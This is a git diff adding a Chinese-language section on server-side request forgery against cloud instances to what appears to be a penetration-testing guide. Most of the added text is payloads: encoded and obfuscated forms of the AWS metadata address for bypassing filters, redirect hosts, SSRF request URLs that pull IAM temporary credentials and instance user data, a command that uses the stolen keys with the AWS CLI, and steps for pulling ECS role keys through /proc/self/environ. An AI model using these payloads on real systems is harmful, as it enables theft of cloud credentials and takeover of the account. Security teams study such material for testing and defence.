@@ -316,3 +316,103 @@ http://受害者网站/ssrf?payload=http://攻击者服务器/delay
 [Blind](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/WEB%E6%BC%8F%E6%B4%9E%E8%BF%9B%E9%98%B6/SSRF/Blind.md)
 
 ## 云实例
+
+### AWS
+
+AWS实例元数据服务是Amazon EC2实例中提供的一项服务，允许这些实例访问有关自身的元数据
+
++ ipv4端点(旧版)：http://169.254.169.254/latest/meta-data/
+
++ ipv4端点(新版)需要X-aws-ec2-metadata-token标头
+
+```bash
+export TOKEN=`curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" "http://169.254.169.254/latest/api/token"`
+curl -H "X-aws-ec2-metadata-token:$TOKEN" -v "http://169.254.169.254/latest/meta-data"
+```
+
++ ipv6端点：http://[fd00:ec2::254]/latest/meta-data/
+
+对于WAF，可能需要尝试不同的方法来连接到API
+
++ 指向AWS API 的DNS记录
+
+```
+http://instance-data
+http://169.254.169.254
+http://169.254.169.254.nip.io/
+```
+
++ HTTP重定向
+
+```
+Static:http://nicob.net/redir6a
+Dynamic:http://nicob.net/redir-http-169.254.169.254:80-
+```
+
++ 对IP进行编码
+
+```
+http://425.510.425.510 Dotted decimal with overflow
+http://2852039166 Dotless decimal
+http://7147006462 Dotless decimal with overflow
+http://0xA9.0xFE.0xA9.0xFE Dotted hexadecimal
+http://0xA9FEA9FE Dotless hexadecimal
+http://0x41414141A9FEA9FE Dotless hexadecimal with overflow
+http://0251.0376.0251.0376 Dotted octal
+http://0251.00376.000251.0000376 Dotted octal with padding
+http://0251.254.169.254 Mixed encoding (dotted octal + dotted decimal)
+http://[::ffff:a9fe:a9fe] IPV6 Compressed
+http://[0:0:0:0:0:ffff:a9fe:a9fe] IPV6 Expanded
+http://[0:0:0:0:0:ffff:169.254.169.254] IPV6/IPV4
+http://[fd00:ec2::254] IPV6
+```
+
+访问启动实例时指定的用户数据
+```
+http://169.254.169.254/latest/user-data
+```
+
+查询有关实例的各种元数据的其它URL，例如主机名、ipv4地址和其它属性
+```
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/ami-id
+http://169.254.169.254/latest/meta-data/reservation-id
+http://169.254.169.254/latest/meta-data/hostname
+http://169.254.169.254/latest/meta-data/public-keys/
+http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
+http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
+http://169.254.169.254/latest/dynamic/instance-identity/document
+
+Jira SSRF导致AWS信息泄露
+https://help.redacted.com/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/metadata/v1/maintenance
+
+公开暴露
+http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/
+```
+
+
+(1)IAM
+
+获取临时凭证
+```html
+/ssrf?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/[Role Name]
+
+# 例子
+/ssrf?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance
+/ssrf?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
+/ssrf?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access
+```
+
+使用IAM凭证交互
+```html
+aws s3 ls --region <region-name> --access-key-id <AccessKeyId> --secret-access-key <SecretAccessKey> --session-token <Token>
+```
+
+(2)ECS
+
+如果在ECS实例上有可访问文件系统的SSRF，可以尝试提取/proc/self/environ以获取UUID
+
+然后执行以下命令提取附加角色的IAM密钥
+```bash
+curl http://169.254.170.2/v2/credentials/<UUID>
+```
